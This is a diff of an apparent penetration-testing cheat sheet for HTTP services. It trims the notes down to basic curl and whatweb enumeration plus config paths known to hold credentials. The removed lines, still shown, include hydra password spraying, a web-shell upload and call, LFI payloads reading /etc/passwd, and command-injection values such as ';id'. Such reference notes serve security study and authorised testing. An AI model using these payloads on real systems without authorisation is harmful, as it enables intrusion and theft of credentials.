@@ -2,161 +2,21 @@
 
 _Port: 80, 443_
 
-## Service Usage
+## Service Enumeration
 
 Basic interaction
 ```bash
 curl -i http://$ip/
 ```
-Ignore self-signed certs (the `-k` flag)
+Other curl
 ```bash
-curl -ik https://$ip/
-```
-Fetch and print first 50 lines of the body
-```bash
-curl -s http://$ip/ | head -n 50
-```
-Follow redirects and save headers only (`-I`)
-```bash
-curl -sIL http://$ip/
-```
-Print only the HTTP status code and final URL
-```bash
-curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" http://$ip/
-```
-Send an OPTIONS request to list allowed methods
-```bash
-curl -X OPTIONS -i http://$ip/
-```
-Send basic auth credentials with a request
-```bash
-curl -u user:pass http://$ip/
-```
-
-## 0. Fast Path (try these first)
-
-Never touch the app before you fingerprint — this dictates everything else:
-```bash
-curl -sIL http://$ip/
+-k      # ignore self-signed certs
+-I      # save headers only
+-X      # Request option
 ```
 Fingerprint the web tech stack (framework, server, version)
 ```bash
 whatweb http://$ip/
-```
-Directory/file brute with ffuf (fastest)
-```bash
-ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak,.old -mc 200,301,302,403
-```
-Directory/file brute with gobuster
-```bash
-gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old -t 40
-```
-
-## 1. Banner Grab & Unauthenticated Enumeration
-
-Aggressive tech fingerprinting (more detail)
-```bash
-whatweb -a 3 http://$ip/
-```
-Version and default-script scan on web ports
-```bash
-nmap -p 80,443 -sV -sC $ip
-```
-Print response headers (often leak framework, version, security posture)
-```bash
-curl -sIL http://$ip/
-```
-Check robots.txt for hidden paths
-```bash
-curl -s http://$ip/robots.txt
-```
-Check sitemap.xml for listed pages
-```bash
-curl -s http://$ip/sitemap.xml
-```
-Check for exposed .git repository metadata
-```bash
-curl -s http://$ip/.git/HEAD
-```
-Check for exposed .env file (config secrets)
-```bash
-curl -s http://$ip/.env
-```
-Check for exposed backup archive
-```bash
-curl -s http://$ip/backup.zip
-```
-Virtual host brute (when app is behind a host header)
-```bash
-ffuf -u http://$ip/ -H "Host: FUZZ.$domain" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default-size>
-```
-nmap HTTP NSE scripts for enum and methods
-```bash
-nmap -p 80,443 --script http-enum,http-headers,http-methods,http-title,http-server-header $ip
-```
-
-## 2. Authenticated Enumeration
-
-Once you have a login, the goal is almost always: find file upload, command injection, or a known CVE.
-Confirm the login page tech/headers
-```bash
-curl -s -I http://$ip/login.php
-```
-Fingerprint the login page stack
-```bash
-whatweb http://$ip/login.php
-```
-Check for a changelog file (leaks app version)
-```bash
-curl -s http://$ip/CHANGELOG.txt
-```
-Check for a version file
-```bash
-curl -s http://$ip/version
-```
-
-## 3. Password Spraying / Bruteforcing
-
-App-level brute force is common but slow. Spray before brute, and always check for rate limiting.
-Spray a single password across users (POST form)
-```bash
-hydra -L users.txt -p 'Spring2026!' $ip http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -t 4
-```
-Brute force with a password list (POST form)
-```bash
-hydra -L users.txt -P pass.txt $ip http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -t 4
-```
-
-## 5. Quick Wins
-
-### 5.1 Identify the app → check known exploits
-```bash
-# After whatweb/robots reveals the app (WordPress, Tomcat, Jenkins, phpMyAdmin...)
-searchsploit <app-name> <version>
-```
-
-### 5.2 File upload → web shell
-```bash
-# Confirm upload dir + execution. Try php, php5, phtml, and image+php polyglot.
-curl -X POST -F "file=@shell.php" http://$ip/upload.php
-curl -s http://$ip/uploads/shell.php?cmd=id
-```
-
-### 5.3 LFI/RFI (if file include is present)
-```bash
-curl -s "http://$ip/page.php?file=../../../../etc/passwd"
-curl -s "http://$ip/page.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
-```
-
-### 5.4 Command injection (in a param)
-```bash
-curl -s "http://$ip/ping.php?ip=127.0.0.1;id"
-curl -s --data "cmd=;id" http://$ip/exec.php
-```
-
-### 5.5 Default credentials — check the app's known defaults before brute
-```bash
-# admin:admin, admin:password, root:root, tomcat:tomcat, etc. (see per-app cheat in §6)
 ```
 
 ## 6. Config Paths
@@ -190,13 +50,6 @@ wp-config.php   -> DB creds in plaintext
 tomcat-users.xml -> manager/role creds, weak defaults
 docker-compose.yml / .env -> service creds
 ```
-
-## 7. Post-Exploit / Pivot
-
-- Web shell → interactive shell (see Linux/Windows PrivEsc notes)
-- DB creds found → MySQL/PostgreSQL notes
-- Internal-only app → port forward/proxychains to reach it
-- Tomcat/Jenkins → WAR/JAR deployment for RCE
 
 ### Common gotchas
 ```text
